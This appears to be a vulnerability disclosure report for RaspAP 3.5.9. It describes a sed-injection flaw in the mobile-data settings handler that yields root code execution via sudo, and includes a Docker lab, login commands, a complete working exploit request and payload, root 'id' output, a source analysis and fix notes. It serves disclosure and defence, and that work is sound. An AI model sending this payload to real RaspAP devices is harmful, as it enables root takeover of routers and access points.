### Vulnerability details

**Official website / Product:** https://raspap.com/

**Repository:** RaspAP/raspap-webgui (stars at selection: 5230)

**Vulnerability type:** RCE (GNU sed injection → sudo root command execution)

**Affected versions:** 3.5.9 (current default branch / tag 3.5.9, commit c897bb5dad245477339072e4b7106677d65c1dc6); MobileDataHandler since the networking/mobile-data feature was introduced

**Vulnerability URL / Parameter:** `POST /ajax/networking/save_net_dev_config.php` parameter `arrFormData[apn-user-mobile]` (likewise `apn-pw-mobile` / `pin-mobile` / `apn-mobile`)

**Complex:** yes

### Verification procedure

1. Rebuild the lab (original `labs/raspap-r31-a2` was torn down after verify; image `raspap-r31-a2-web:latest` removed). In any directory write the `Dockerfile` / `docker-compose.yml` below, plus the embedded `wvdial.conf` and sudoers line, then build and start (host **21102→80**; stack: `php:8.2-apache` plus sudoers matching `installers/raspap.sudoers:91`: `www-data NOPASSWD:/bin/sed -i * /etc/wvdial.conf`). Use repo tag/commit **3.5.9 / c897bb5dad245477339072e4b7106677d65c1dc6** (bind-mount local `repos/raspap-webgui` or `git clone` inside the image). Default credentials: `admin` / `secret`.

```dockerfile
# Dockerfile — php:8.2-apache + sudoers + initial /etc/wvdial.conf (RaspAP 3.5.9)
FROM php:8.2-apache
RUN apt-get update && apt-get install -y --no-install-recommends sudo git \
    && rm -rf /var/lib/apt/lists/* \
    && a2enmod rewrite
# Place RaspAP 3.5.9 at DocumentRoot (build context must contain the tree, or switch to git clone)
COPY . /var/www/html/
RUN cp /var/www/html/config/config.php /var/www/html/includes/config.php \
    && mkdir -p /etc/raspap/networking \
    && chown -R www-data:www-data /var/www/html /etc/raspap \
    && printf '%s\n' \
         '[Dialer Defaults]' \
         'Init1 = AT+CPIN="XXXX"' \
         'Init3 = AT+CGDCONT=1,"IP","web.vodafone.de"' \
         'Username = vodafone' \
         'Password = me' \
         > /etc/wvdial.conf \
    && chown root:root /etc/wvdial.conf && chmod 644 /etc/wvdial.conf \
    && echo 'www-data ALL=(ALL) NOPASSWD:/bin/sed -i * /etc/wvdial.conf' \
         > /etc/sudoers.d/090_raspap \
    && chmod 0440 /etc/sudoers.d/090_raspap
```

```yaml
# docker-compose.yml
services:
  web:
    build: .
    image: raspap-r31-a2-web:local
    container_name: raspap-r31-a2
    ports:
      - "21102:80"
```

```bash
docker compose up -d --build
# Expected: Network raspap-r31-a2_default Created; Container raspap-r31-a2 Started
# Browse http://127.0.0.1:21102/
```

Lab summary: repo RaspAP/raspap-webgui, version 3.5.9 (commit `c897bb5dad245477339072e4b7106677d65c1dc6`), host port 21102, path `POST /ajax/networking/save_net_dev_config.php` → `MobileDataHandler::updateDialerConfig`.

2. Log in to obtain a session and CSRF token (login calls `session_regenerate_id`; the `PHPSESSID` / `csrf_token` values in the PoC are lab-captured — replace them when reproducing):

```bash
# Fetch login-page CSRF + initial PHPSESSID
curl -s -c /tmp/raspap.cj -b /tmp/raspap.cj http://127.0.0.1:21102/login \
  | tee /tmp/raspap-login.html >/dev/null
# Prefer hidden-field value; fall back to <meta name="csrf_token" content="...">
CSRF=$(sed -n 's/.*name="csrf_token" value="\([^"]*\)".*/\1/p' /tmp/raspap-login.html | head -1)
# CSRF=$(sed -n 's/.*name="csrf_token" content="\([^"]*\)".*/\1/p' /tmp/raspap-login.html | head -1)

curl -s -c /tmp/raspap.cj -b /tmp/raspap.cj -X POST 'http://127.0.0.1:21102/login' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode "csrf_token=${CSRF}" \
  --data-urlencode 'login-auth=' \
  --data-urlencode 'username=admin' \
  --data-urlencode 'password=secret' \
  --data-urlencode 'redirect-url=/' -o /dev/null -D -

# After login, open any authenticated page to refresh CSRF (index.php emits meta csrf_token)
curl -s -c /tmp/raspap.cj -b /tmp/raspap.cj http://127.0.0.1:21102/networking \
  | tee /tmp/raspap-net.html >/dev/null
CSRF=$(sed -n 's/.*name="csrf_token" content="\([^"]*\)".*/\1/p' /tmp/raspap-net.html | head -1)
# PHPSESSID in the cookie jar is the session for subsequent requests
```

Equivalent login HTTP shape (field names from `templates/login.php` / `includes/login.php`):

```http
POST /login HTTP/1.1
Host: 127.0.0.1:21102
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=<pre-login-session>
Connection: close

csrf_token=<from-login-form>&login-auth=&username=admin&password=secret&redirect-url=%2F
```

3. POST to `/ajax/networking/save_net_dev_config.php` with `arrFormData[interface]=mobiledata` and set `arrFormData[apn-user-mobile]` to the plaintext payload `x|;e id >/var/www/html/rce_proof.txt #` (see the fully URL-encoded request below).
4. The response reports success; then `GET /rce_proof.txt` shows `uid=0(root)`.

### Complete vulnerability PoC

Complete HTTP request (Docker-verified):

```http
POST /ajax/networking/save_net_dev_config.php HTTP/1.1
Host: 127.0.0.1:21102
User-Agent: raspap-r31-a2-poc/1.0
Accept: application/json
Content-Type: application/x-www-form-urlencoded
Origin: http://127.0.0.1:21102
Referer: http://127.0.0.1:21102/networking
Cookie: PHPSESSID=56e9fb23e91bca6432eb00e755988700
Content-Length: 307
Connection: close

csrf_token=c0452b049d76df07f2288ca56bd8e9d44ef10e2a69bf8e0495bd3a337248fb96&arrFormData%5Binterface%5D=mobiledata&arrFormData%5Bpin-mobile%5D=0000&arrFormData%5Bapn-mobile%5D=internet&arrFormData%5Bapn-user-mobile%5D=x%7C%3Be+id+%3E%2Fvar%2Fwww%2Fhtml%2Frce_proof.txt+%23&arrFormData%5Bapn-pw-mobile%5D=pass
```

Plaintext form-field map (explanatory only; send the URL-encoded body above):

| Field | Value |
| --- | --- |
| `csrf_token` | `c0452b049d76df07f2288ca56bd8e9d44ef10e2a69bf8e0495bd3a337248fb96` |
| `arrFormData[interface]` | `mobiledata` |
| `arrFormData[pin-mobile]` | `0000` |
| `arrFormData[apn-mobile]` | `internet` |
| `arrFormData[apn-user-mobile]` | `x\|;e id >/var/www/html/rce_proof.txt #` |
| `arrFormData[apn-pw-mobile]` | `pass` |

Complete HTTP response (raw Docker-lab response):

```http
HTTP/1.1 200 OK
Date: Mon, 02 Nov 2026 00:01:31 GMT
Server: Apache/2.4.69 (Debian)
X-Powered-By: PHP/8.2.35
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 65
Connection: close
Content-Type: application/json

{"return":0,"output":["Successfully saved mobile data settings"]}
```

#### Impact proof: `GET /rce_proof.txt`

```http
GET /rce_proof.txt HTTP/1.1
Host: 127.0.0.1:21102
Connection: close
```

Response body (same as the in-container file):

```text
uid=0(root) gid=0(root) groups=0(root)
```

Post-injection `/etc/wvdial.conf` excerpt:

```text
[Dialer Defaults]
Init1 = AT+CPIN="0000"
Init3 = AT+CGDCONT=1,"IP","internet"
Username = x
Password = pass
```

Verification result notes:

Docker returned `{"return":0,"output":["Successfully saved mobile data settings"]}`. `GET /rce_proof.txt` and the in-container file both show `uid=0(root) gid=0(root) groups=0(root)`, proving GNU sed's `e` flag ran `id` as root via sudo. `/etc/wvdial.conf` Username became `x`, matching the post-injection sed replacement.

### Vulnerability analysis

`ajax/networking/save_net_dev_config.php` routes `arrFormData[interface]=mobiledata` to `MobileDataHandler::handle()`, which calls `updateDialerConfig()`. PIN/APN/username/password are concatenated into a GNU sed script using `|` delimiters and wrapped only with `escapeshellarg()`. That helper is shell-safe, **not** sed-safe. Injecting `|e <cmd> #` into `apn-user-mobile` terminates the `s` command and invokes GNU sed's `e` command. Combined with `installers/raspap.sudoers` (`www-data ALL=(ALL) NOPASSWD:/bin/sed -i * /etc/wvdial.conf`), execution is **root**. This is an unexpected injection bypass on the mobile-data save path, not a designed system/WiFi command surface.

Entry route and form-field map:

```php
# File: ajax/networking/save_net_dev_config.php
# Lines: 35-37
    if (($form['interface'] ?? '') === 'mobiledata') {
        $handler = new MobileDataHandler();
        $response = $handler->handle($form);
```

```php
# File: src/RaspAP/Networking/MobileDataHandler.php
# Lines: 27-36 (handle field map)
    public function handle(array $post): JsonResponse
    {
        $cfg = [
            'pin' => $post["pin-mobile"] ?? '',
            'apn' => $post["apn-mobile"] ?? '',
            'apn_user' => $post["apn-user-mobile"] ?? '',
            'apn_pw' => $post["apn-pw-mobile"] ?? '',
            'router_user' => $post["apn-user-mobile"] ?? '',
            'router_pw' => $post["apn-pw-mobile"] ?? ''
        ];
```

Trigger / sink source (full path and line numbers):

```php
# File: src/RaspAP/Networking/MobileDataHandler.php
# Lines: 60-82
    private function updateDialerConfig(array $cfg): void
    {
        $replacements = [
            'Init1 = AT\+CPIN=".*"' => 'Init1 = AT+CPIN="' . $cfg['pin'] . '"',
            'Init3 = AT\+CGDCONT=1,"IP",".*"' => 'Init3 = AT+CGDCONT=1,"IP","' . $cfg['apn'] . '"',
            '^Username = .*' => 'Username = ' . $cfg['apn_user'],
            '^Password = .*' => 'Password = ' . $cfg['apn_pw']
        ];

        foreach ($replacements as $pattern => $replacement) {
            if (trim($replacement) !== '') {
                $cmd = sprintf(
                    'sudo /bin/sed -i -E %s %s',
                    escapeshellarg("s|$pattern|$replacement|"),
                    escapeshellarg($this->cfgFile)
                );
                exec($cmd, $output, $return);
                if ($return !== 0) {
                    error_log("Failed to execute: $cmd\nOutput: " . implode("\n", $output));
                }
            }
        }
    }
```

Sudoers (`installers/raspap.sudoers:91`):

```text
www-data ALL=(ALL) NOPASSWD:/bin/sed -i * /etc/wvdial.conf
```

`$this->cfgFile` comes from `RASPI_WVDIAL_CONFIG` (default `/etc/wvdial.conf`). For `apn_user=x|;e id >/var/www/html/rce_proof.txt #`, the sed script becomes:

```text
s|^Username = .*|Username = x|;e id >/var/www/html/rce_proof.txt #|
```

`escapeshellarg` only single-quotes the whole script; GNU sed still parses `|e ...` as a separate `e` command and runs it as root.

### Fix notes

1. Do not interpolate user input into sed scripts; rewrite `/etc/wvdial.conf` in PHP or via a fixed helper with allowlisted arguments.
2. If sed must remain: strict allowlist for PIN/APN/user/password (e.g. `^[A-Za-z0-9._@+-]+$`), conflict-free delimiters / `\Q\E`, and disable the `e` extension.
3. Tighten sudoers: replace broad `sed -i *` with a dedicated wrapper that only updates predefined keys.
